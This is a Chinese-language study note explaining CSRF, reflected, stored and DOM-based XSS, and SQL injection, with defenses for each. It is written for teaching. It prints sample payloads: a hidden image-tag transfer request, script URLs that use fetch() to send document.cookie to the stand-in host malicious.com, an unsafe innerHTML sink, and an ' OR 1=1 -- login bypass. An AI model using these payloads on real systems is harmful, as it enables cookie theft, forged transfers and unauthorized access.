# 2.前端安全性相关

## a. CSRF(跨站请求伪造）？

**CSRF(跨站请求伪造)**：攻击者诱使受害者的浏览器执行未经授权的请求，通常是在受害者已经登录目标站点并在其会话中持有有效凭据的情况下。简而言之，CSRF 攻击的目标是利用受害者当前的身份来执行某些操作，而受害者通常不会意识到这些操作的发生。

**CSRF 攻击简化流程**：
1. **目标**：攻击者希望攻击某个受害者在网站 `bank.com` 上的账户，该受害者在 `bank.com` 有登录状态。
2. **建立陷阱**：攻击者在一个他控制的网站 `evil.com` 上放置了一个恶意脚本或者构造了一个看起来正常的链接。这个链接或脚本其实是向 `bank.com` 发送一个请求。
   - 例如：`<img src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fbank.com%2Ftransfer%3Fto%3Dattacker%26amount%3D1000&pos_id=img-kXng9Qhn-1694418053406)" width="0" height="0">`
   - 当受害者访问 `evil.com` 时，上述链接会尝试向 `bank.com` 发起一个转账请求。
3. **利用用户登录状态**：如果受害者在 `bank.com` 处于登录状态，并且其浏览器还有 `bank.com` 的 Cookie，这个请求就会带上这个 Cookie，因为浏览器会自动附带相应站点的 Cookie。从 `bank.com` 的角度看，这个请求看起来是一个合法的用户请求。
4. **完成攻击**：如果 `bank.com` 没有进行 CSRF 保护，它会执行这个恶意请求，将受害者的钱转到攻击者的账户。

**如何防范 CSRF 攻击**：
1. **使用 CSRF 令牌**：为每个会话和请求生成一个随机的、不可预测的令牌。只有在收到正确的令牌时，服务器才会处理请求。
2. **检查 Referer 标头**：如果请求的来源不是预期的域（例如从 `evil.com` 来的请求），那么可以拒绝该请求。
3. **强制重新认证**：对于敏感的操作（如转账），要求用户再次输入密码或进行其他形式的二次认证。
4. **设置 cookie 中的 sameSite**：限制跨站点携带 cookie。

**我的问题**：
cookie 默认情况就是不跨域的，为什么受害者访问 `evil.com` 时点击了链接能发送 `bank.com` 的 Cookie？

问题的核心并不在于 cookie 是否可以在不同的域之间“共享”，而在于浏览器的行为和如何处理带有 cookie 的请求。

这就是 CSRF 攻击的核心：**它不是试图窃取或直接利用 Cookie，而是利用浏览器的这种自动行为来执行未经授权的操作**。

## b.跨站脚本攻击（XSS）？

跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一种在 web 应用中插入恶意脚本的攻击方式。攻击者利用这种攻击方法可以执行任意的脚本代码，并借此获得对网站或其用户的非法访问权限。XSS 攻击的成功往往是因为网站未能正确地过滤用户输入的内容。

### 1.工作原理
- 攻击者在 web 应用的某个地方插入恶意 JavaScript 代码。
- 当其他用户浏览这个被植入了恶意代码的页面时，他们的浏览器会执行这段代码。
- 一旦代码被执行，攻击者就可以利用这段代码实现多种恶意行为，如窃取 cookie、生成伪造请求或展示虚假信息。

### 2.三种 XSS
**存储型 XSS**：
- **机制**：这是最常见的 XSS 攻击形式。在这种攻击中，恶意脚本被永久保存在目标服务器上。当用户请求该数据（例如，读取一篇论坛帖子或查看评论）时，服务器将数据连同恶意脚本一起发送给用户的浏览器，然后在浏览器中执行该脚本。
- **示例**：一个用户在社交网站上发布了一个评论，其中嵌入了恶意脚本。每当有人查看这条评论时，该脚本就会在他们的浏览器中执行。
- **风险**：存储型 XSS 攻击是持续的，除非恶意内容从服务器上删除，否则每个访问该内容的用户都可能受到攻击。

**反射型 XSS**：
- **机制**：与存储型 XSS 不同，反射型 XSS 中的恶意脚本并不存储在服务器上。相反，攻击者通常会将恶意脚本放在 URL 中，然后诱导受害者点击这个 URL。当用户点击该链接时，请求发送到服务器，服务器将恶意脚本作为响应的一部分返回，然后在用户的浏览器中执行。
- **示例**：攻击者发送了一个伪装成合法网站链接的电子邮件。该链接的 URL 中含有恶意脚本。当用户点击该链接时，服务器简单地将该脚本反射回用户的浏览器，并执行它。
- **风险**：该攻击是一次性的，只有点击恶意链接的用户会受到攻击。

**DOM 型 XSS**：
- **机制**：这种类型的攻击主要涉及页面的 DOM（文档对象模型）。在这里，服务器可能返回无害的数据，但由于前端脚本的不恰当处理，恶意输入可能会被执行为脚本。这种攻击主要利用了客户端（如 JavaScript）在处理用户输入时的缺陷。
- **示例**：考虑一个搜索功能，用户的搜索词会被显示在搜索结果中。如果前端 JavaScript 代码简单地将 URL 中的搜索参数获取出来，并直接插入到页面中，那么攻击者可以在 URL 的搜索参数中插入恶意脚本，从而在其他用户的浏览器中执行该脚本。
- **风险**：与反射型 XSS 类似，这种攻击通常需要诱骗用户执行某些操作（例如，点击链接或访问某个页面）。

为了避免 XSS 攻击，开发者需要确保在将用户输入的数据插入到 web 页面之前，对其进行适当的验证和转义。此外，内容安全策略（CSP）和其他现代浏览器安全措施也可以帮助降低 XSS 攻击的风险。

### 3.预防方法
- 对所有用户输入进行严格的验证和过滤。
- 使用适当的输出编码，确保动态内容在页面中被安全地呈现。
- 使用内容安全策略（Content Security Policy, CSP）限制可执行的脚本。
- 避免使用或限制使用能解析并执行代码的函数，如 `eval()`。
- 对敏感的 cookie 设置 `httpOnly` 属性，这样即使脚本尝试访问 cookie，浏览器也不会返回这些 cookie 的内容。

### DOM 型 XSS 攻击详解
我将为您描述一个具体的 DOM 型 XSS 攻击的例子。

**场景**：假设我们有一个简单的搜索引擎网站，它使用 JavaScript 从 URL 的查询参数中获取用户输入的搜索关键词，然后直接将其显示在搜索结果页面上。以下是这个操作的简化版 JavaScript 代码：

```javascript
// 获取 URL 中 "q" 参数的值
let userQuery = new URLSearchParams(window.location.search).get('q');

// 直接在页面上显示搜索关键词
document.getElementById('search-result').innerHTML = "您搜索的是：" + userQuery;
```

**攻击过程**：
1. 攻击者注意到这个网站直接从 URL 的 `q` 参数中获取数据，并不经过任何过滤或转义就将其插入到页面中。
2. 攻击者构建以下 URL，其中包含一个恶意的 JavaScript 脚本作为 `q` 参数的值：

```js
http://example.com/search?q=<script>fetch('http://malicious.com/steal?cookie='+document.cookie)</script>
```

3. 攻击者将这个恶意链接分享到社交媒体、论坛或通过其他方式诱导受害者点击。
4. 当受害者点击此链接时，他们的浏览器会打开这个搜索引擎网页。因为网页中的 JavaScript 代码没有进行任何数据验证或转义，所以 `<script>` 标签中的恶意代码会被执行。
5. 恶意脚本将受害者的 cookie 信息发送到攻击者控制的 `malicious.com` 域名。

**防御措施**：
要防止 DOM 型 XSS 攻击，网站开发者可以采取以下措施：
1. 永远不要信任用户输入。即使数据是从 URL、表单、Cookies 或任何其他来源获取的，也应对其进行验证和转义。
2. 使用 `.textContent` 或其他安全方法，而不是使用 `.innerHTML` 来插入数据，因为 `.innerHTML` 可能会执行嵌入其中的脚本。
3. 使用内容安全策略 (CSP) 来限制哪些脚本可以被执行。
4. 了解并使用现代 JavaScript 框架（如 React、Vue 或 Angular）提供的内置 XSS 防护机制。

### 反射性 XSS 详解
我将为您描述一个具体的反射型 XSS 攻击的例子。

**场景**：假设有一个网站，该网站允许用户通过 URL 的查询参数来自定义欢迎消息。例如，当用户访问 `http://example.com/welcome?name=Alice` 时，网站会显示“Hello, Alice!”。该网站的后端代码简单地从 URL 获取 `name` 参数，并将其嵌入到返回给用户的 HTML 页面中。

**攻击过程**：
1. 攻击者发现这个功能并意识到网站没有过滤或转义 `name` 参数的值。
2. 攻击者构建以下 URL，其中包含一个恶意的 JavaScript 脚本作为 `name` 参数的值：

```
http://example.com/welcome?name=<script>fetch('http://malicious.com/steal?cookie='+document.cookie)</script>
```

3. 攻击者通过电子邮件、社交媒体、或其他方法将这个恶意链接发送给受害者，试图诱骗他们点击。
4. 当受害者点击该链接时，他们的浏览器会请求上述网址，服务器简单地将 `<script>` 标签中的恶意代码作为响应的一部分返回给受害者的浏览器。
5. 由于该代码被嵌入到返回的 HTML 页面中，所以它会在受害者的浏览器中执行，导致恶意脚本将受害者的 cookie 信息发送到攻击者控制的 `malicious.com` 域名。

**防御措施**：
要防止反射型 XSS 攻击，网站开发者可以采取以下措施：
1. 永远不要信任用户输入。无论数据来源如何，都应对其进行验证、清理和转义。
2. 使用 HttpOnly 属性：会话 cookie，使用 HttpOnly 标志。这样的 cookie 不能通过 JavaScript 访问，从而增加了安全性。
3. 使用内容安全策略 (CSP) 来限制可执行的脚本，尤其是来自外部源的脚本。
4. 考虑使用现代 web 开发框架，如 React、Vue 或 Angular，因为它们通常提供了防止 XSS 的内置机制。

这只是反射型 XSS 的一个简化示例，但它提供了一个关于如何进行这种攻击和如何进行防御的基本概念。

### DOM 型与反射型的区别？
您的困惑是可以理解的，因为反射型 XSS 和 DOM 型 XSS 在某些方面确实很相似，特别是它们都涉及从 URL 获取恶意载荷并在用户的浏览器中执行。但它们之间存在一些关键的区别：

1. **数据的处理位置**：
   - **反射型 XSS**：攻击载荷首先被发送到服务器，然后服务器将载荷反射回（即响应）客户端，并在返回的页面中执行该载荷。换句话说，服务器在处理用户输入并生成响应时，对恶意载荷进行了回显。
   - **DOM 型 XSS**：恶意载荷完全在客户端（浏览器）中处理。服务器可能会收到攻击载荷，但并不直接将其嵌入到返回的 HTML 中。相反，是客户端的 JavaScript 代码从 URL、DOM 或其他客户端的资源中获取载荷，并在页面上执行它。
2. **服务器的作用**：
   - **反射型 XSS**：服务器在这种攻击中起到了关键作用，因为它回显了攻击载荷。如果您捕获并查看服务器的响应，您应该能够看到恶意脚本。
   - **DOM 型 XSS**：攻击完全在浏览器端发生，服务器端的响应通常不包含恶意脚本。攻击载荷是由浏览器端的代码（如 JavaScript）处理并执行的。
3. **防御方法**：
   - **反射型 XSS**：需要确保服务器正确地验证、清理和转义所有从用户接收的数据，然后再将其插入到返回的 HTML 中。
   - **DOM 型 XSS**：除了服务器端的防御措施外，还需要确保客户端的 JavaScript 代码不会不安全地处理和执行用户数据。
  
## c、SQL 注入攻击（针对前端与后端交互场景）

**1.机制：**
攻击者通过在用户输入的数据中插入恶意 SQL 语句，欺骗应用程序执行这些恶意语句，从而获取、修改或删除数据库中的数据。

**2.风险：**
数据泄露、数据被篡改、数据库被破坏等。

**场景：**
假设有一个用户登录的网页，后端代码通过拼接用户输入的用户名和密码来构造 SQL 查询语句以验证用户身份。

**正常登录流程：**：
用户在登录页面输入正确的用户名（比如“user1”）和密码（比如“password123”），后端代码可能会生成类似这样的 SQL 查询语句：`SELECT * FROM users WHERE username='user1' AND password='password123'`，如果查询到匹配的记录，则用户登录成功。

**SQL 注入攻击过程**：
1. 攻击者观察到登录页面的输入框，猜测后端可能的 SQL 查询逻辑。
2. 攻击者在用户名输入框中输入：`' OR 1=1 --`，密码随便输入或者留空。
3. 后端接收到这个输入后，构造的 SQL 查询语句可能变成：`SELECT * FROM users WHERE username='' OR 1=1 --' AND password='any_password'`。
   - 这里的 `OR 1=1` 总是为真，而 `--` 是 SQL 中的注释符号，后面的密码验证部分被注释掉了。
4. 数据库执行这个查询时，会返回所有用户的记录，因为 `1=1` 总是成立。攻击者就可以成功登录系统，即使不知道正确的用户名和密码。

这种攻击可能导致未经授权的用户访问敏感信息、修改数据甚至破坏整个数据库系统。

**3.预防方法：**
- 对用户输入进行严格的验证和过滤。
- 使用参数化查询或存储过程来处理数据库操作，避免直接拼接 SQL 语句。
- 同时，限制数据库用户的权限，以减少攻击成功后的影响范围。